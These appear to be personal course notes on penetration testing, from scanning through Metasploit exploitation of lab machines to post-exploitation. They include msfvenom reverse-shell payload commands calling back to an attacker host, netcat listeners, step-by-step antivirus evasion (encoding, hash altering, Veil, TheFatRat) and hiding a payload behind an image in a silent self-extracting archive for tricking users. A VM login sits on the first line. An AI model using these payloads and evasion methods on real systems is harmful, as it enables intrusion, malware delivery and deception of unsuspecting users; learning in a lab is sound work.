KALIVM USERNAME:PASSWORD - mrh:2195

____________________________________________________________________
INFO GATHERING
____________________________________________________________________
ping
nslookup
ipinfo.info
whois
whatweb
theHarvester - removed from kali linux since it had problems, so cloned from github
hunter.io
redhawk(github)
sherlock(github)
email-scraper.py(course resource - present in EHRSRC)
INFO: search for new information gathering tools in online repos(eg: github) if something doesn't work that's present in kalilinux
FOR MORE: https://securitytrails.com/blog/osint-tools



____________________________________________________________________
SCANNING
____________________________________________________________________
top 10 vulnerable machines
https://www.rapid7.com/blog/post/2011/12/23/where-can-i-find-vulnerable-machines-for-my-penetration-testing-lab/

metasploitable(downloaded)

arp (show a list of all hosts connected to your related network [only shows infos those are already pinged])

netdiscover (finds all of the available hosts available on a network by broadcasting arps [better than arp])

netstat -nr (show network routing table with numeric values)

nmap-------------------------------------------------------------------------------------------------------------------------------------------------
|  NMAP SCAN TYPES
|  nmap (normally it scans famous 1000 ports but being explicit, also scans others)
|  nmap -sS <ip_addr> (TCP SYN scan)
|  nmap -sT <ip_addr> (TCP connect scan)
|  nmap -sU <ip_addr> (UDP scan)
|  nmap -O <ip_addr> (OS Fingerprinting)
|  nmap -sV <ip_addr> (Version of services running in target machine)
|  nmap -sV --version-intensity [1-9] <ip_addr> (same as above with specified intensity[default intensity - 7, i.e default for above cmd])
|  nmap -A <ip>  (alternative to -O,-sV,nmap script scanning and as the flag suggests, scans aggressively)
|  nmap -sn <ip/ip-range> (no port scan [similar to netdiscover cmd])
|  
|  NMAP PORT & SPECS
|  nmap -p [<port_number>] [<p1>,<p2>,...,<pn>] [plow-phigh] <ip_addr> (scan for specific port numbers)
|  nmap -p- <ip_addr> (scan all ports)
|  nmap -F <ip_addr> (scan top 100 ports that are used mostly)
|  nmap -oN <output_filename> <other flag_misc> (stdo to file and console)
|  
|  NMAP EVADE FW & IDS
|  nmap -f <ip_addr> (fragment ip packet into several parts while pinging) [on adding another -f, 8 fragments add up to divide packet again by +8 i.e. 16 fragments but on real some program can't handle these types of tiny packets]
|  nmap --mtu <multiple of 8> <ip_addr> (above's multiple -f flags alternative)
|  nmap -D RND:<number of decoys> <ip_addr> (send n  number of packets as if even different ip addressed computers along with u tried to send packets just to make IDS confused)
|  nmap -D <random_private_ip1,ip2,...,ME> <target_ip> (here ME is your local IP)
|  NOTE: above 1st decoy cmd works best for targets that are on another network, 2nd decoy cmd are for targets within the same network. [for behind the scenes use wireshark to know random ip_addrs used]

TIP: Zenmap for GUI XP of nmap
NOTE: to view progress & ETA for longer scan, press UP arrow
FOR MORE: https://nmap.org/book/man.html



____________________________________________________________________
VULNERABILITY ANALYSIS
____________________________________________________________________
before analyzing, try not to reinvent the wheel cause there might be exploits found for a specific service already!

(NMAP) nmap scripts location: usr/share/nmap/scripts
To run a script: nmap --script [<script_category>|<specific_script>] <target> <scan-type>
<script_category> = firewall | exploit | banner | malware | auth ->>AND MORE....
FOR MORE: https://nmap.org/book/nse-usage.html
Description about the script: nmap --script-help <script_name.nse>

searchsploit(kali linux) in cmd
eg: searchsploit <servicename_/w_version(as present in nmap -sV result)>
after searching, result shows 2 columns(exploit title, path)
in path it shows partial path to the exploit script eg: linux/remote/16922.rb
so copy the exploit filename and search for the file using locate cmd,
i.e.> locate 16922.rb (exploits are by default present in kali linux and not in other linux distros)
then run the script wrt the extension of the script

nessus : https://www.tenable.com/downloads/nessus
to install : sudo dpkg -i <nessus_filename>
logon to: https://kali:8834/ (port number might vary, but when starting the nessus service try to check the printed description while switching it on)



____________________________________________________________________
EXPLOITATION 
____________________________________________________________________

FEW IMPORTANT TERMINOLOGIES AND DEFS:
        PAYLOAD : payload is the part of the private user text which could also contain malware such as worms or viruses which performs the malicious action
        EXPLOIT: piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability
                TIP: the best analogy to understand the difference bet. exploit & payload is that an exploit is the way to create a pipeline and the payload is the script that's used to perform all sorts of stuffs in the target system using that pipeline
        BIND SHELL : have the listener(basically it means opening a port so that a service runs in that port) running on the target and the attacker connect to the listener in order to gain a remote shell.(due to firewall, port opening restrictions might be present in target system, creating a bind shell might not work in some cases)
        REVERSE SHELL : have the listener running on the attacker and the target connects to the attacker with a shell.(the target tries to connect to the attacker's specific open port)

(msfconsole)metasploit-framework-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|  location in kali linux: /usr/share/metasploit-framework/
|  some important files defs inside the above folder as follows:
|          msfconsole - to open the metasploit-framework in cmd
|          msfvenom - tool to generate payload/shell
|          modules/ - folder consisting of all follows in metasploit
|                  exploits/ - program execute set of command in target machine to gain access like Buffer overflow, RCE etc
|                  auxiliary/ - not a payload but performs actions like scanning(such as version, eg: bruteforce login panels for ssh), fuzzing, DOS attacks etc(sometimes used in first 2 stages of penetration testing)
|                  post/ - as the name suggests post exploitation module that's usually used after successfully gaining access to the target device and get info such as files, hashes etc
|                  payloads/ - some code that's delivered to target that allows attackers to steal information
|                          singles/ - payloads that are standalone, eg: adding a user to the target system etc
|                          stagers/ - setup a network connection between attacker and target system and designed to be small & reliable and done by shells(reverse, bind)[tcp & udp]
|                          stages/ - payload components that are downloaded by stagers modules, can provide adv. feats. /w no size limits
|                  encoders/ - helps evading anti virus detection(normally for us a payload's a script but for targets its a virus so this help to encode and make payloads less detectable by the antivirus)
|                  evasion/ - pretty much the same as encoders/
|                  nops/ - (no operation) instruction for the processor which means do nothing(useful to execute buffer overflow attacks) 
|  
|  TIP: (in msfconsole, we can also run normal linux cmds such as: ifconfig, ls, cd without the help of opening another terminal)
|  
|  MSFCONSOLE BASIC CMDS, MODULE SELECTION AND AHEAD:(TO REM: the thing we do everytime in mfsc is use a module/ by selecting an exploit, then set options for the module/, the payload and the target and finally exploit!)
|  > help (for help manual)
|  > show payloads (list all available payloads present in /usr/share/metasploit-framework/ which shows columns such as number, name etc
|  > show exploits (same as above but shows all exploits)
|  > sessions (shows sessions that are created with target's machine)
|  > use <name_from_the_show_list> (to use an exploit. Eg: use exploit/windows/smb/ms06_040_netapi)
|  after the above module is selected to view all info/description about it:
|  > show info (to view the code we can get to the msf location[/usr/share/metasploit-framework/] and get to the related module folder)
|  we need to setup options for the module that we're gonna use, so the following cmd shows what all options are available to configure the specific module you've chosen
|  > show options
|  basically it shows 3 different options:
|          module options: options to setup the target's info such as ip_addr, port (RHOSTS,RPORT) etc
|          payload options: options to setup the attacker's system such as when creating a rev_tcp_shell we need to give attacker's ip, port (LHOST,LPORT) etc(basically it is setup already for us by msf itself, but mods could be done)
|          exploit targets: shows all the vulnerable targets available predefined for the particular module/ selected(it could be a software or for a specific OS that's running in the target system) Eg: list of specific exploits for win10, win7 etc or in case a software it is by default no specialization takes place 
|  to set an option the following cmd is used:
|  > set <option_name> <value/s> (eg: set LHOST 192.168.1.15)
|  we can again use "show options" to see if the value changed is set
|  
|  we can also change the payload but usually what msf gives would be best but sometimes it might not work.
|  but still we can change the payload for a specifically selected module/ by listing the payloads using "show payloads" but this time only the possible payloads will be listed for that specific module/(i.e. exploit)
|  after that we can copy the name of the payload and type the foll. cmd:
|  > set payload <payload_name> (make sure while setting a rev. or bind shell while setting the payload option,change respective ip_addr, ports (RHOST, LHOST, LPORT, RPORT))
|  to list all targets we can use "show targets" and to set use the foll. cmd:
|  > set target <id_number>
|  if no specific target info is known an "Automatic" option would be present in targets but only scopes within the known targets and not others. Eg: if targets are present for win10,win7, Automatic won't work out for winXP
|  and finally to execute the setup we've did so far the foll. cmd is used:
|  > exploit (even 'run' cmd can be used[but for some specifics 'run' can only be used])
|  
|  MSFCONSOLE OTHER MISC:
|  to search a specific software service:
|  > search <software_name>

[VIDEO (vsftpd - FIRST VULNERABILITY EXPLOITATION)] METASPLOITABLE 2.0
        start scanning metasploitable VM using nmap (-sV) and 
        then use searchsploit to search for the service /w version whether we have an exploit for that and check whether metasploit version of exploit is available
        if its available goto metasploit and do "search <software_name>" and select the matching version with "use <exploit_loc>" and the following steps are done:
Eg: Exploiting vsftpd 2.3.4
> use exploit/unix/ftp/vsftpd_234_backdoor
> set <params> <param_value>
> exploit

[VIDEO (BindShell Misconfiguration - basically a metasploitable shell that's opened without any username or password unconfigured)] METASPLOITABLE 2.0
NC(Netcat):
> nc -h (help menu)[pretty much the whole help page is self explanatory]
eg: to connect to a service: nc <ip_addr> <port_number>

[VIDEO (Telnet Exploitation - similar to above but with default username & password that's not changed)] METASPLOITABLE 2.0
to access telnet in cmd:
> telnet <ip_addr> (asks for username and password. In our case both are: msfadmin)

[VIDEO (Samba Exploitation - here we tend to find out the exact version of samba before exploiting)] METASPLOITABLE 2.0
after scanning in nmap (-sV) we tend to find out the partial version of samba service but 
we to find the exact version we use msfconsole and in it using the auxiliary module we have a submodule called scanner and within it we have specifics to smb(samba).
so using autocomplete feature we can enter the foll. cmd:
> use auxiliary/scanner/smb/[PRESS_TAB] (here [PRESS_TAB] literally means pressing the tab button in your keyboard to view all possibilities)
the rest shows available scanner scripts and from that we select the following:
> use auxiliary/scanner/smb/smb_version (since we wanna scan the version of smb we select it)
after selecting the auxiliary, we setup the necessary options(such as RHOSTS) and then enter 'run'
Now after finding the exact version of smb we search for an exploit for that particular version using:
> searchsploit Samba 3.0.20
we get a metasploit module from the search result. i.e: 'Username' map script' Command Execution 
so to search and use that script in msfconsole we enter:
> search exploit samba
in result check for the keyword 'username' in description column and note its particular name which is the following and to use it:
> use exploit/multi/samba/usermap_script' (here multi/ says that this exploit works for different OS)
again we set options(RHOSTS) and run it using 'exploit' cmd to gain root access 

[VIDEO (SSH Exploitation - here we brute force usernames(n), passwords(m)[nxm combinations] to check whether weak passwords are set)] METASPLOITABLE 2.0
here we use one of the auxiliary module to brute login to SSH so we search:
> search auxiliary scanner ssh
from the result we search for a script description: 'SSH Login Check Scanner'.This script allows us to bruteforce SSH target so we use it as follows:
> use auxiliary/scanner/ssh/ssh_login
Now in options we set RHOSTS and 2 other main params (USER_FILE,PASS_FILE).
as we're bruteforcing the SSH those are mandatory so for both the USER_FILE, PASS_FILE we enter the location of a .txt file that contains usernames and passwords 1/line
so we enter the absolute path of those txt files for both those brute params as follows:
> set USER_FILE /home/$(whoami)/Desktop/usernames.txt
> set PASS_FILE /home/$(whoami)/Desktop/passwords.txt
now we can run 'exploit' or even set another option called 'VERBOSE' to true to get detailed info about the brute process
Now you might use the shell to execute commands in the target's machine so in msfc using a cmd called:
> sessions (displays all the sessions compromised in target's system so far)
from that we can note the Id of the session from the Id column and use the following cmd to start interacting with the target machine:
> sessions -i <Id>
since we got the username, password of the SSH we can use the normal of accessing it as follows:
> ssh <username>@<ip_addr> (after initalization, asks for password )
eg: ssh msfadmin@192.168.1.98

[VIDEO (Unreal IRCd backdoor Command Execution(CE))] METASPLOITABLE 2.0
here after nmap -sV we get the info UnrealIRCd running in 6667
search for the following:
> searchsploit unrealircd (a BCE exploit in metasploit is found)
search in msfc:
> search unrealircd (one result shown same as in searchsploit)
select it by entering "use 0"(since that's the only exploit shown i.e. exploit/unix/irc/unreal_ircd_3281_backdoor)
set all options and default payload wont be setup so use the following:
> set payload [PRESS_TAB] (shows all possible shell payloads), eg:
> set payload /cmd/unix/reverse
since we've selected reverse shell we set the ip for LHOST
then 'exploit'

[VIDEO (distccd Arbitrary Command Execution(ACE))] METASPLOITABLE 2.0
search 'ccd' in msfc and select the following:
> use exploit/unix/misc/distcc_exec
set options (RHOSTS, LHOST[if revshell is set as payload]) and 'exploit'

[VIDEO (Ruby DRb RMI Command Execution)] METASPLOITABLE 2.0
in this case we search for ruby drb but we get no luck in msfc so using searchsploit we find out the exploit named as 'Distributed Ruby - Send instance_eval/syscall Code Execution (Metasploit)'
but in msf6 it is not present, so we need to proceed with the searchsploit by find out the path of that script which is done the following cmd:
> searchsploit -p <path_column_number> (in our case path_column_number = 17058)
try copying the file to the msf's linux/misc module and execute it in msfc as follows:
> use exploit/linux/misc/<name_of_script>.rb
set options and 'exploit'

[VIDEO (VNC Protocol 3.3 (Default Password))] METASPLOITABLE 2.0
using vncviewer application in Kali linux we can connect it with the default password as follows:
> vncviewer <target_ip> (default password: password)

[VIDEO (Java RMI Code Execution)] METASPLOITABLE 2.0
searching we search msfc for 'rmi' and results related to it and further filtering from them we get the following and use it:
> use exploit/multi/misc/java_rmi_server
set options as said previously but in this case the default payload selected is meterpreter which seems to run using java
here only the session is created, so to access the shell we use the 'sessions' cmd and see the id number of the meterpreter shell from the Id column and then type the following:
> session -i <Id_number>
so after entering into the target's shell we can enter the following: (use help command in meterpreter for all available cmds)
meterpreter > shell (normally the shell consists of its own aliases of cmds so to use the bash one this helps)

[VIDEO (MicrosoftDS(SMBv1) Eternal Blue Exploit)] WINDOWS 7 Ultimate SP1 x64
NOTE: this exploit works only if windows firewall is turned off as in real world windows PCs when pinged, they normally filter it but one that's used to provide services to a company or elsewhere those ports would be opened, so we're not faking anything in here
first we need to check whether our target's win7 machine is vulnerable to this exploit. so we use the auxiliary module present in msfc,
so we search for it as follows:
> search eternalblue
from the search result we get an auxiliary called: smb_ms17_010, so we use it as follows:
> use auxiliary/scanner/smb/smb_ms17_010
set options (RHOSTS) and 'run'. After run it shows whether its vulnerable/not
now we run the exploit that resulted in the search as follows, i.e: ms17_010_eternalblue:
> use exploit/windows/smb/ms17_010_eternalblue
set the options (RHOSTS) 
after above cmd a default payload will be setup but make sure it matches the target's pc architecture as by default 64bit meterpreter revshell for windows would be selected
so to change it use the foll:
> set payload windows/meterpreter/reverse_tcp (in case of 64 bit the payload selection will be: "windows/x64/meterpreter/reverse_tcp")
now run 'exploit' to start the exploitation
after gaining the shell access in meterpreter use the following cmd to view the account type:
> getuid (getuserid[OUTPUT: NT AUTHORITY/SYSTEM] this account type is the highest account privilege rights) 
since we are in meterpreter we can enter 'shell' to get the dedicated windows cmd in attacker's pc or using the cmd 'help' we can get other options like:
> meterpreter > screenshot
> meterpreter > hashdump
DISCLAIMER: THE FOLLOWING EXTRA DIDN'T WORKOUT WHILE PERFORMING. TBE
EXTRA: the same exploit when run in a 32 bit version of win7 it won't work even after the auxiliary scanner says that's its vulnerable to it
but after switching off the firewall and if we try it, we get the BSOD(Blue scree of death) which actually crashes the system itself due to integer overflow(this overflow is caused by the exploit itself which couldn't be handled by a 32bit win7 PC)

[VIDEO (MicrosoftDS(SMBv1) DoublePulsar Exploit)] WINDOWS 7 SP1 x64/x86
NOTE: this exploit works only if windows firewall is turned off as in real world windows PCs when pinged, they normally filter it but one that's used to provide services to a company or elsewhere those ports would be opened, so we're not faking anything in here
for this attack we need wine(application that's allows executing windows apps in linux). so the deps. and cmds for installing are as follows:
> sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
after installing wine we need to know where the drive C:/ of wine is present, so we download python 2.7.14 x86(.msi) from python.org
and run the following cmd to install it:
wine msiexec /i <file_name>.msi
then after installing we should now have the .wine/ folder inside the /root directory and to view it we need root acc.access
then we need to clone the following exploit from git:
> git clone https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit.git
then we have the copy the folder(deps/) and its contents present in Eternalblue-Doublepulsar-Metasploit/ into metasploit's exploit/windows/smb module directory (/usr/share/metasploit-framework/modules/exploits/windows/smb/) as follows:
cp <cloned_directory>/Eternalblue-Doublepulsar-Metasploit/deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb/ -r (-r to recursively copy deps/ folder's content)
then do the same for eternalblue_doublepulsar.rb file present in Eternalblue-Doublepulsar-Metasploit/ into metasploit's exploit/windows/smb module directory (/usr/share/metasploit-framework/modules/exploits/windows/smb/) as follows:
cp <cloned_directory>/Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
then we copy the cloned repo(Eternalblue-Doublepulsar-Metasploit/ folder & its contents) to /root/ directory as follows:
cp <cloned_directory>/Eternalblue-Doublepulsar-Metasploit/ /root/ -r
now open metasploit and then we use the following exploit we imported as follows:
> use exploit/windows/smb/eternalblue_doublepulsar
after selection now setting options such as RHOSTS, LHOST should be done along with exploit specifics such as follows:
PROCESSINJECT - explorer.exe|lsass.exe (explorer for x86, lsass for x64)
TARGETARCHITECTURE - x86|x64
for settings payload for different archs. use as follows:
> set payload windows/x64/meterpreter/reverse_tcp (for 64 bit)
> set payload windows/meterpreter/reverse_tcp (for 32 bit)
after setting all options and target specific payloads we then exploit the target using the 'run' cmd

[VIDEO (Windows RDP BlueKeep Exploit)] WINDOWS 7 SP1 x64
NOTE: this exploit works only if port 3389(this port is usually used by RDP) is opened(to check do 'nmap -sS <target_ip>'), if not press start and enter 'allow remote access to computer', and within that window in Remote Desktop section press 'Allow connections....'. This is usually turned off for home PCs but as of in an enterprise/company this would normally be opened, so we're not faking anything in here
using msfc we can search for "search bluekeep" start exploiting and also check whether it is vulnerable to the exploit an auxiliary module is available and executed as follows:
> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce (here make sure the target is set to the right version of windows using "set target <target_id>" and to display different targets use "show targets" as it includes even whether the Win7 OS runs in BareMetal/VirtualBox/Hyper-V etc)
also settings other options and the right payload start exploiting using the cmd 'exploit'

[VIDEO (Windows SMBGhost Manual Exploitation)] WINDOWS 10 x64 1903 19H1 Build 18362.356-2019.09
NOTE: this exploit works only if port 445 (this port is usually used by SMB) open & windows firewall is turned off as in real world windows PCs when pinged, they normally filter it but one that's used to provide services to a company or elsewhere those ports would be opened, so we're not faking anything in here
This exploit works for win10 1903 or 1909 (To download these specific version we can use rufus and select download mode and select spec. OS and build number)
This is a manual exploitation technique since we don't have any modules present in msfc
-> So to start we can use nessus to SCAN whether target is vulnerable to smbghost exploit else:
        to get the cve (common vulnerabilities and exposures) id we can search for the exploit name(smbghost) in the web
        after finding the cve id we need a scanner that can check whether the target is vulnerable to smbghost
        search for any related smbghost scanner present in github or else where(The link we got: https://github.com/dickens88/cve-2020-0796-scanner)
        to execute the above scanner we download, do as follows:
        > cd <repo_location>
        > python3 cve-2020-0796-scanner.py -t <target_ip> (scan result shows whether target is vulnerable to it/not)
-> now we'll try to CRASH the target's machine, so we do the same by searching online and we come up with the following repo: (https://github.com/maxpl0it/Unauthenticated-CVE-2020-0796-PoC [The repo cloned in the video: https://github.com/jiansiting/CVE-2020-0796])
        to execute the above cloned script, do as follows:
        > cd <repo_location>
        > python3 crash.py <target_ip> (result should crash the target win10 PC)
        (In video the following is used "python3 cve-2020-0796.py <target_ip>")
-> now to EXPLOIT the target we again search for an exploit online (https://github.com/ZecOps/CVE-2020-0796-RCE-POC)
this repo consists of a .bat file that should be executed in target win10 machine(for reason check out the README.md file in the repo)
now on executing the .bat file we get the offset result for the current win10 version that's running in the target machine
we can now compare that with the offset that's present in the file named "SMBleedingGhost.py"
if any of the 5 offsets are different we can change that similar to the target's offset in the script file(SMBleedingGhost.py)
in our case the 4th and 5th offset are different so we set it similar to the target's offset
after exploiting the target, it should connect to our listener so we need to open a port in the attacker's machine(basically we're creating a reverse shell)
in order to do it we need netcat and run it as follows:
> nc -lvp 4444 (attacker listening in port 4444)
then the exploit(SMBleedingGhost.py) has to be executed from a windows OS and then redirect the connection to the attacker's kali linux machine to pop a shell as follows:
> python3 SMBleedingGhost.py <target_ip> <listening_attacker_ip> <listener's_port_no.> (also the listening_attacker's PC could also be the windows machine but make sure netcat is installed to create a listening port)
(this exploit might crash target's win10 pc but trying eventually will work out)

Intro to RouterSploit:
Download using the following link: https://github.com/threat9/routersploit.git
A program that allows users to check whether home routers are vulnerable to any exploit and also consists of same interface such as msfc
the modules present in routersploit are: exploits, scanners, creds, generic, payloads, encoders
For eg: (to run all exploits with the target router to check if it's vulnerable to any)
> use scanners/autopwn
> show options (used to set options such as target router's ip_addr)
after entering it scans whether it is vulnerable to any exploits
TO DOWNLOAD: https://github.com/threat9/routersploit (to install check out the README.md in the git repo)
FOR MORE: https://www.threat9.com/blog



____________________________________________________________________
GAINING ACCESS
____________________________________________________________________

this section pretty much talks about gaining access where previously(exploitation section) we did the same but what if the target doesn't have any type of vulnerability present nor an exploit to gain access.
but thing to remember is that the attacker's part is also to deliver the payload to the target machine no matter what medium it is(previously it was done with the help of an exploit).
right now we need the target to execute it on behalf of the attacker(eg: through email, http webpage, usb drive etc) and along with that try bypassing antivirus softwares and other types of detections that forces against our payloads
Creating payloads can be done with the help of a tool called MSFVENOM

(msfvenom)-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|  
|  MSFVENOM is used to generate payloads really fast with a simple command and gain target's access
|  for help menu:
|  > msfvenom -h
|  to create a payload we do the foll.:
|  > msfvenom -p <type_of_payload> LHOST <attacker's_ip> LPORT <attacker's_port> -f <payload's_extension> -o <filename_/w_extension> (here <type_of_payload> is similar to the one like we saw in msfc)
|  eg: > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST 192.168.1.13 LPORT 5555 -f exe -o shell.exe
|  in the above eg. we're creating a payload(-p) for winx64 OS i.e. a rev_shell with our attacker's ip and port so that the target machine connects to our attacker's PC to output a shell. -o is the output filename and -f is the extension of the outputfile which works as a legitimate .exe file)
|  the outputfile would be in the Desktop/ (for now we can copy the payload to the target's machine using a USB drive or a local python file server)
|  to create a python http file server use the cmd as follows:
|  python3 -m http.server <port_number>
|  now after copying/downloading the payload to the target's machine(make sure windows defender is off and also the firewall later we'll check to bypass these) we need to create a rev shell so that we can listen to the port we mentioned in the payload
|  [HAVEN'T TESTED YET!!!] -> we can use nc(netcat) to listen but msfc provides with a much more adv. features
|  > use exploit/multi/handler
|  see options and set to the same LHOST and RHOST that was in the payload and along with that set the payload similar to the payload we created in msfvenom as follows:
|  > set LHOST 192.168.1.13
|  > set LPORT 5555
|  > set payload windows/x64/meterpreter/reverse_tcp
|  > run
|  now after running the listener in the attacker's PC we can run the payload in the target's side so that it'll start the meterpreter session
|  make sure you run the listener before the payload in the target's pc is executed
|  (here questions might be raised like what's the use of copying the payload intentionally and pasting in the target's PC, and call it hacking? but the point here is that user make mistakes and try downloading stuffs from the internet they see, so using that as a vulnerability(a person download miscellaneous softs. from the internet) and the uesr as an exploit, hacker tries to make them download the malicious file(payload), and as said already it can be by any medium(email, web server, copying it directly using USB stick etc))
|  
|  MSFVENOM ADVANCED OPTIONS:
|  other advanced options usually be to bypass antivirus, reduce payload's size etc.
|  to see what all extensions can msfv create a payload, we can use the foll. cmd:
|  > msfvenom --list formats (other --list values are: payloads, encoders, nops, platforms, archs, encrypt, all)
|  there's reason for using these different formats since it makes the payload undetectable by any antivirus software.
|  to check the level of detectablity we can use the following link: https://www.virustotal.com/gui
|  This website allows to upload the payload we created using msfv and check whether it is detectable by several antivirus softwares,
|  but if the level is lower it doesn't mean it would be undetectable later where they might be detectable after a few days/ a week(This isn't really something to worry about but there are someother websites like virustotal which doesn't share the payload's fingerprint but virustotal's the best so far)
|  
|  now let's create 2 different payloads and let's compare their detection level:
|  payload 1 (a simple one with no adv. features used):
|  > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe -o shell.exe
|  payload 2 (/w adv. options used):
|  > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -a x64 -e x64/zutto-dekiru -i 15 --platform windows -n 500 -f exe -o shell.exe
|  the definitions for the above used cmd flags are as follows:
|  -a - architecture of the target's machine [x64|x32] (to list all use "> msfvenom --list archs")
|  -e - encoder is designed to take the input (shellcode) and transform it somehow, encoding the same instructions in different bytes to make it undetectable by antivirus softs. Here we've used an x64 bit specific encoder(to list all encoders available, the cmd "> msfvenom --list encoders" can be used)
|  -i - no. of iterations the encoder encodes the shell code(make sure that greater the iteration, greater the payload's size but less detectable by AVS(antivirus softwares) and viceversa)
|  --platform - OS that the target's running (to list all use "> msfvenom --list platforms")
|  -n - no operation prepended to the payload with a specific length
|  
|  now on comparing both these payloads in virustotal the one with advanced options is much less FUD(fully undetectable) by AVS(even though we create payloads with msfv and still be used by a vast majority payloads it creates are likely detectable nowadays)
|  we can also use another option called templating(-x) i.e. taking a legitmate .exe file and creates a shell around it which is also known as masquerading. Eg: using the software Putty for the follwing example:
|  > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -x putty.exe -o shell.exe (also when scanning this in virustotal it can bypass some reasonable amount of antiviruses)
|  NOTE: for the above cmd while templating would end up in success as it might not work and it depends upon the template software that we'll use. so choose wise!
|  
|  we can also send another format(extension) of payload using the -f flag which makes it bypass pretty much all AVS, but there are some problems with it
|  i.e. the extensions that needs software/compiler/interpreter might not be installed in the target's system.
|  eg: python might be installed only in linux and mac but not on windows so on distribution there be no way of running the payload but rather install python in order to execute the payload

FOR CREATING AND UPLOADING A PAYLOAD THROUGH TARGET HOSTED WEBSITE(refer the foll. section in WEB APP PENETRATION TESTING): [VIDEO (Command Injection)] METASPLOITABLE 2.0 --> [EXTRA (MSFV & MSFC FOR WEB PAGE COMMAND INJECTION)]

OTHER TOOLS LIKE MSFVENOM FOR PAYLOAD CREATION(the following tools present below should be ran with root access(> sudo su)):
veil (apt-get install veil)
        > veil
        > use 1 (use evasion)
        > list (lists all payloads)
        > use 22 (for selecting the foll. payload: powershell/meterpreter/rev_tcp.py)
        > set SLEEP 20 (once target executes the program sleeps for 20 seconds before starting the portforwarding process)
        > set LHOST <target_ip>
        > generate (to generate the output file)
        after this it asks for the filename so given: powerpayload
        now the src code will be present in /var/lib/veil/output/source/powerpayload.bat
        and a metasploit resource file will be written to /var/lib/veil/output/handlers/powerpayload.rc
        METASPLOIT RESOURCE file consists of predefined options that we've set in the veil using the set command, so no need reinitializing the LHOST, LPORT again every time
        since the output file is a .bat file (powerpayload.bat) we need to convert it to an .exe since a basic code when loaded will trigger AVS
        so well use a software called Bat2Exe(B2E) https://github.com/tokyoneon/B2E.git that converts bat file to an exe file. This runs only in windows so we'll use wine in order to install it in Kali Linux as follows:
        > cd <git_cloned_location>/B2E
        > unzip <cloned_zip_filename>
        > wine <program_name.exe> (bunch of next n times and install)

        now knowing the location of the .batfile we'll open it in the B2E application
        there are several options but mainly there's an option called Packer(to enable UPX compression but it triggers a lot of AVS so uncheck it)
        go to converter and click convert and select destination to save it
        now try transferring the powerpayload.exe to the target system
        now open msfc and copy the msf resource file location and type the following cmd:
        > resource /var/lib/veil/output/handlers/powerpayload.rc (this sets the options for our exploit to start listening in the background)
        now executing the powerpayload.exe in target's system will produce a shell after 20 seconds since we gave a cmd SLEEP 20, in order to create a different hash for the .exe which makes it bypassable by some AVS
        and then we gain the meterpreter session opened and to execute it:
        > sessions (to view sessions that are active)
        > sessions -i <session_Id>

thefatrat (https://github.com/screetsec/TheFatRat.git)
        follow the README.md to install thefatrat after that:
        > ./fatrat
        > 6 (for selection the foll. option: Create FUD Backdoor 1000% with PwnWinds)
        > 2 (Create exe file with C# + Powershell (FUD 100%))
        Set LHOST, LPORT IP
        asks for basename for output file: BatBackdoor
        asks us type of payload we select windows/meterpreter/reverse_tcp (not sure whether it is architecture independent)
        shows the location of the outputfile: /root/Fatrat_Generated/RatBackdoor.exe
        for setting up the listener we can press number (9) to jump back to menu and select number(10) to jump to msfc and setup options for exploit/multi/handler and start listening
        now transfer the .exe payload from the output folder to our target's system
        next after a session is established we get the meterpreter shell opened

NOTE: There is no clear way of bypassing AVS and these methods get outdated all the time and new ones occur. However there are things that you can do to make your payload less detected
such as:
        -> Creating your own payloads:
                Best way to learn a programming language and start creating payloads with it or use and existing one 
                and try adding some dummy functions that does nothing but just creates a different hash
        -> Keeping updated with new tools:
                searching for different new tools online so that it is not widely being used for the timebeing so it might be FUD
        -> Using tools and try creating new hashes out of it:
                try creating a payload with known tools and try to insert new code that makes no sense but doesn't output an error
                other means such as using msfv and hexeditor we can change the binary of the executable payload as follows:
                > msfvenom -p windows/meterpreter/reverse_tcp LHOST=<target_ip> LPORT=<target_port> -f exe -o shell.exe (create a payload using msfv)
                note down the hash of the payload by using the cmd: 'md5sum <payload_name.exe>
                > hexeditor <payload_name.exe>
                here after opening make sure not to change anything unwanted but change stuffs like a string that might look like "This program cannot be run in DOS mode"
                try changing values from 0-9 and a-f and save it using ctrl+x
                now compare the hash with the older payload and the one we changed with hex editor, they'll be totally different
        -> masking payloads to look different:
                there are several ways of doing but, the foll. shows you how to merge a png image with a payload(but it will create an exe as the output file but still windows has extension view disabled by default) and on clicking an image would open in the foreground and the payload in the background
                first create an icon file and a simple payload with msfv
                now in windows select both .png and payload.exe and click "add to archive"(need winrar for this)
                set a name for it (car.exe) and the archive format to ZIP and in archiving options check "create SFX archive"
                goto advanced and click SFX options and under setup give the names of the file that need to be execute in order as follows:
                car.png
                payload.exe
                then goto modes and in silent mode set the "hide all" option
                then in update tab, in update mode set "extract and update files" and in overwrite mode set "overwrite all files" 
                then in text and icon tab, browse for "Load SFX icon from the file" and select the icon file and then click "OK"
                the masked payload will be created



____________________________________________________________________
POST EXPLOITATION
____________________________________________________________________
this module is all about the possibilities that happens after exploiting and gaining access to the target machine and perform stuffs like:
traversing through folders
lookup for saved/hashed passwords over all applications
set keyloggers
escalate privilege
persist connection for later usage even after the compromised target machine is restarted/rebooted
hack into networks/other machines that belongs to the target's network and much more
to search for post exploitation modules in msfc we can use: search post/windows (for windows)

we've seen some commands in meterpreter in the previously 2 chapter, now we'll dive deep into those.
some of the COMMANDS that we use in the METERPRETER session are as follows:
        > help (opens all available commands in meterpreter)
        > background|bg (this helps to go back to the normal msfc without closing the session which still runs in the background but to access that shell "sessions -i <session_Id>")
        > guid (get the session's user id)
        > getuid (tells which we are on the target machine)
        > pwd,ls,dir,cat,cd (works normally like linux commands)
        > download <file_name> (download file to attacker's machine (/Desktop))
        > upload <file_name> (upload file to target machine)
